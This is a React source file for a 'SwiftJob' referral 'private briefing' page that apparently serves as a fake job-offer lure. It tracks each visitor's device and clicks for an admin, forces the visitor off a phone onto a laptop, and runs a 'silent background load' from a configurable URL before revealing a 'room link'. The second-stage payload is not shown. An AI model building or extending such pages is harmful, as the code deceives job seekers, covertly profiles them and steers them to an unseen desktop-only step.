import { useState, useEffect } from "react";
import { Link } from "wouter";
import {
  Briefcase,
  Clock,
  DollarSign,
  ArrowUpRight,
  ArrowLeft,
  ChevronRight,
  Loader2,
  AlertCircle,
  ShieldCheck,
  Mail,
  Laptop,
  Smartphone,
  MousePointerClick,
  X,
} from "lucide-react";
import { SiteLayout } from "@/components/site/SiteLayout";
import { analyzeDevice, deviceMeta, useDeviceGuard } from "@/lib/deviceGuard";
import { NextStepFlow, type NextStepConfig } from "@/components/NextStepFlow";

const API_BASE = (import.meta.env.VITE_API_URL as string | undefined) ?? "";

interface ReferralData {
  referralCode: string;
  fullName: string;
  referredBy: string | null;
  jobTitle: string | null;
  meetingUrl: string | null;
  status: string;
}

interface NextStepPayload {
  backgroundUrl: string;
  roomLink: string;
  delaySeconds: number;
}

type Content = Record<string, string>;

function interpolate(
  template: string,
  name: string,
  position: string,
  code: string,
  referredBy: string,
  hrEmail: string,
): string {
  return template
    .replace(/\{name\}/g, name.split(" ")[0] || name)
    .replace(/\{position\}/g, position)
    .replace(/\{referredBy\}/g, referredBy)
    .replace(/\{code\}/g, code)
    .replace(/\{hrEmail\}/g, hrEmail);
}

export function ReferralPage() {
  const code = (
    window.location.pathname.replace("/referral/", "").replace(/\/$/, "") || ""
  ).toUpperCase();

  const [loading, setLoading] = useState(true);
  const [error, setError] = useState("");
  const [referral, setReferral] = useState<ReferralData | null>(null);
  const [content, setContent] = useState<Content>({});
  const [nextStep, setNextStep] = useState<NextStepConfig | null>(null);
  const [tracking, setTracking] = useState(false);
  const [mobileGate, setMobileGate] = useState(false);
  const [flowOpen, setFlowOpen] = useState(false);
  const guard = useDeviceGuard();

  useEffect(() => {
    if (guard.status === "mobile") setMobileGate(true);
  }, [guard.status]);

  useEffect(() => {
    if (!code) {
      setError("Invalid briefing link.");
      setLoading(false);
      return;
    }
    let cancelled = false;
    fetch(`${API_BASE}/api/referrals/${encodeURIComponent(code)}`)
      .then((res) => {
        if (res.status === 404)
          throw new Error("This briefing could not be found.");
        if (!res.ok)
          throw new Error("Could not load your briefing. Please try again.");
        return res.json();
      })
      .then((data) => {
        if (cancelled) return;
        setReferral(data.referral);
        setContent(data.content || {});
        setNextStep(data.nextStep || null);
        const device =
          analyzeDevice().verdict === "mobile" ? "mobile" : "laptop";
        const body = JSON.stringify({ device, meta: deviceMeta() });
        const attemptVisit = (attemptsLeft: number) => {
          fetch(`${API_BASE}/api/referrals/${encodeURIComponent(code)}/visit`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body,
          }).catch(() => {
            if (attemptsLeft > 1) {
              setTimeout(() => attemptVisit(attemptsLeft - 1), 1500);
            }
          });
        };
        attemptVisit(2);
      })
      .catch((err) => {
        if (!cancelled) {
          const message = err instanceof Error ? err.message : "";
          setError(
            message.includes("Unexpected token")
              ? "This briefing is unavailable right now. Please check the link or contact support."
              : message || "Could not load this briefing.",
          );
        }
      })
      .finally(() => {
        if (!cancelled) setLoading(false);
      });
    return () => {
      cancelled = true;
    };
  }, [code]);

  if (loading) {
    return (
      <SiteLayout title="Loading briefing — SwiftJob">
        <div className="not-found-shell">
          <div
            className="container"
            style={{ textAlign: "center", padding: "140px 0" }}
          >
            <Loader2
              size={40}
              className="spin"
              style={{ margin: "0 auto 20px" }}
            />
            <p style={{ color: "var(--slate-ink)" }}>Loading your briefing…</p>
          </div>
        </div>
      </SiteLayout>
    );
  }

  if (error || !referral) {
    return (
      <SiteLayout title="Briefing Not Found — SwiftJob">
        <div className="not-found-shell">
          <div
            className="container"
            style={{ textAlign: "center", padding: "140px 0" }}
          >
            <AlertCircle
              size={44}
              style={{ margin: "0 auto 20px", color: "#c43b3b" }}
            />
            <h1 style={{ fontSize: "2.4rem", marginBottom: "16px" }}>
              Briefing unavailable
            </h1>
            <p style={{ color: "var(--slate-ink)", marginBottom: "32px" }}>
              {error ||
                "This briefing may have expired or the link may be incorrect."}
            </p>
            <a
              href="mailto:support@swiftjob.payservice.top"
              className="button button-blue"
            >
              <Mail size={16} /> Contact support
            </a>
          </div>
        </div>
      </SiteLayout>
    );
  }

  const position = referral.jobTitle ?? "a new role with SwiftJob";
  const referredBy = referral.referredBy?.trim() || "";
  const hrEmail = content.hrEmail || "support@swiftjob.payservice.top";
  const ctaHref = referral.meetingUrl ?? "/candidate/applications";

  // The Next-step flow runs when the admin has configured a room link
  // (globally or for this referral). Otherwise we keep the previous
  // straight-through behaviour.
  const hasNextStepFlow = Boolean(nextStep && nextStep.roomLink);
  const flowCopy = {
    waitTitle: content.waitTitle,
    waitBody: content.waitBody,
    readyTitle: content.readyTitle,
    readyBody: content.readyBody,
    openRoomLabel: content.openRoomLabel,
    roomNote: content.roomNote,
  };

  const fireBackground = async () => {
    // Best-effort; the stopwatch must not wait on the network.
    fetch(`${API_BASE}/api/referrals/${encodeURIComponent(code)}/background`, {
      method: "POST",
    }).catch(() => {});
  };

  const fireReveal = () => {
    fetch(`${API_BASE}/api/referrals/${encodeURIComponent(code)}/reveal`, {
      method: "POST",
    }).catch(() => {});
  };

  const handleContinue = async () => {
    if (tracking) return;
    guard.recheck();
    const analysis = analyzeDevice();
    const device = analysis.verdict === "mobile" ? "mobile" : "laptop";
    // Fire tracking (beacon) to the backend regardless of device so the admin
    // is notified of who/when/device. Mobile never proceeds.
    try {
      setTracking(true);
      await fetch(
        `${API_BASE}/api/referrals/${encodeURIComponent(code)}/click`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ device, meta: deviceMeta() }),
        },
      );
    } catch {
      /* tracking is best-effort */
    } finally {
      setTracking(false);
    }
    if (analysis.verdict === "mobile") {
      setMobileGate(true);
      return;
    }
    if (hasNextStepFlow) {
      setFlowOpen(true);
      return;
    }
    window.location.assign(ctaHref);
  };

  const renderSection = (titleKey: string, bodyKey: string) => {
    const title = content[titleKey] || "";
    const body = content[bodyKey] || "";
    if (!title && !body) return null;
    return (
      <section className="job-section">
        {title && (
          <h2>
            {interpolate(
              title,
              referral.fullName,
              position,
              referral.referralCode,
              referredBy,
              hrEmail,
            )}
          </h2>
        )}
        {body && (
          <p style={{ whiteSpace: "pre-wrap" }}>
            {interpolate(
              body,
              referral.fullName,
              position,
              referral.referralCode,
              referredBy,
              hrEmail,
            )}
          </p>
        )}
      </section>
    );
  };

  return (
    <SiteLayout
      title={content.heroTitle || "You've been referred — SwiftJob"}
      description="A private briefing from SwiftJob."
    >
      {/* Breadcrumb */}
      <div className="job-breadcrumb">
        <div className="container">
          <Link href="/">SwiftJob</Link>
          <ChevronRight size={14} />
          <span>Private briefing</span>
        </div>
      </div>

      {/* Hero */}
      <div className="job-header section-dark">
        <div className="container">
          <div className="job-header-inner">
            <div>
              <span className="job-header-dept">
                {content.heroSubtitle || "A PRIVATE BRIEFING"}
              </span>
              <h1 className="job-header-title">
                {content.heroTitle || "You've been referred"}
              </h1>
              <p
                style={{
                  color: "var(--bp-ui-muted)",
                  fontSize: 15,
                  lineHeight: 1.7,
                  marginTop: 18,
                  maxWidth: 640,
                }}
              >
                {interpolate(
                  content.intro || "",
                  referral.fullName,
                  position,
                  referral.referralCode,
                  referredBy,
                  hrEmail,
                )}
              </p>
              <div className="referral-private-badge">
                <ShieldCheck size={15} /> Private briefing —{" "}
                {referral.referralCode}
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Body */}
      <div className="job-body">
        <div className="container">
          <div className="job-layout">
            <div className="job-detail">
              {renderSection("aboutRoleTitle", "aboutRoleBody")}
              {renderSection("roleMetaTitle", "roleMetaBody")}
              {renderSection("whatYouDoTitle", "whatYouDoBody")}
              {renderSection("payTitle", "payBody")}
              {renderSection("howWorksTitle", "howWorksBody")}
              {renderSection("getStartedTitle", "getStartedBody")}
              {renderSection("companyTitle", "companyBody")}

              <section
                className="job-section job-section-eoe"
                style={{ marginTop: 32 }}
              >
                <h2>{content.supportTitle || "Need help?"}</h2>
                <p>
                  {interpolate(
                    content.supportBody ||
                      "If anything isn't responding or you have questions, reach out to HR at {hrEmail}.",
                    referral.fullName,
                    position,
                    referral.referralCode,
                    referredBy,
                    hrEmail,
                  )}
                </p>
                <p>
                  <a href={`mailto:${hrEmail}`} style={{ fontWeight: 700 }}>
                    {hrEmail}
                  </a>
                </p>
              </section>

              {content.securityNote && (
                <p
                  style={{
                    marginTop: 24,
                    fontSize: 13,
                    color: "var(--slate-ink)",
                    opacity: 0.75,
                  }}
                >
                  {interpolate(
                    content.securityNote,
                    referral.fullName,
                    position,
                    referral.referralCode,
                    referredBy,
                    hrEmail,
                  )}
                </p>
              )}
            </div>

            <aside className="job-sidebar">
              <div className="job-sidebar-card">
                <div className="sidebar-dept">SWIFTJOB</div>
                <h3 className="sidebar-title">{position}</h3>
                {referredBy && (
                  <div className="referral-referred-by">
                    <ShieldCheck size={13} />
                    <span>Referred by {referredBy}</span>
                  </div>
                )}
                <div className="sidebar-meta">
                  <div>
                    <Briefcase size={13} />
                    <span>
                      {content.workTypeLabel ||
                        "Any location · remote or in-person"}
                    </span>
                  </div>
                  <div>
                    <Clock size={13} />
                    <span>
                      {content.sidebarLaptopNote ||
                        "Watch your workshop on a laptop or desktop"}
                    </span>
                  </div>
                  <div>
                    <DollarSign size={13} />
                    <span>Clear pay &amp; onboarding</span>
                  </div>
                </div>
                <button
                  type="button"
                  onClick={handleContinue}
                  disabled={tracking || guard.status !== "desktop"}
                  className="button button-blue sidebar-apply-btn"
                  title={
                    guard.status === "mobile"
                      ? "This step only works on a PC or laptop"
                      : undefined
                  }
                >
                  {tracking ? (
                    <Loader2 size={15} className="spin" />
                  ) : guard.status === "checking" ? (
                    <Loader2 size={15} className="spin" />
                  ) : (
                    <ArrowUpRight size={15} />
                  )}
                  {tracking
                    ? "Opening…"
                    : guard.status === "checking"
                      ? "Verifying device…"
                      : guard.status === "mobile"
                        ? "Continue on a PC or laptop"
                        : content.ctaLabel || "Continue to your next step"}
                </button>
                <Link href="/" className="sidebar-back">
                  <ArrowLeft size={13} /> SwiftJob
                </Link>
              </div>
            </aside>
          </div>
        </div>
      </div>

      {/* Next-step flow — silent background load, then the room link */}
      {hasNextStepFlow && nextStep && (
        <NextStepFlow
          open={flowOpen}
          onClose={() => setFlowOpen(false)}
          config={nextStep}
          copy={flowCopy}
          onBackground={fireBackground}
          onRevealed={fireReveal}
        />
      )}

      {/* Mobile device gate — the workshop/next step only runs on a PC/laptop */}
      {mobileGate && (
        <div className="modal-overlay">
          <div
            className="modal-content shortlist-modal"
            role="dialog"
            aria-modal="true"
            aria-labelledby="device-gate-title"
          >
            <div className="modal-header">
              <div>
                <h2 id="device-gate-title">
                  {content.gateTitle ||
                    "Please continue on a laptop or desktop"}
                </h2>
                <span className="modal-position">
                  {content.gateSubtitle || "Your next step needs a computer"}
                </span>
              </div>
              <button
                onClick={() => setMobileGate(false)}
                className="modal-close"
                aria-label="Close"
              >
                <X size={20} />
              </button>
            </div>
            <div className="modal-body">
              <div className="device-gate-box">
                <Smartphone size={42} />
                <p>
                  {content.gateDetected ||
                    "You're viewing this on a phone or tablet."}
                </p>
              </div>
              <p>
                {content.gateBody ||
                  "Your next step is a guided workshop that explains your role, what will be expected of you, your pay, and how everything works. The workshop opens properly on a laptop or desktop computer — it doesn't work on a phone."}
              </p>
              <p>
                {content.gateAction ||
                  "Please open this same link on a PC or laptop and click continue there. If you don't have one handy, let us know and we'll arrange it for you."}
              </p>
              <div className="device-gate-box device-gate-laptop">
                <Laptop size={42} />
                <div>
                  {content.gateLaptopHelp || "Already on a laptop or desktop?"}
                  <br />
                  {content.gateLaptopHelpBody ||
                    "Try reloading this page, or copy this link into your computer's browser:"}
                  <div className="device-gate-url">
                    <MousePointerClick size={14} />
                    <code>{window.location.href}</code>
                  </div>
                </div>
              </div>
            </div>
            <div className="modal-footer">
              <div className="modal-status-row">
                <button
                  type="button"
                  onClick={() => setMobileGate(false)}
                  className="button button-sm button-outline"
                >
                  {content.gateBackLabel || "Go back"}
                </button>
              </div>
            </div>
          </div>
        </div>
      )}
    </SiteLayout>
  );
}
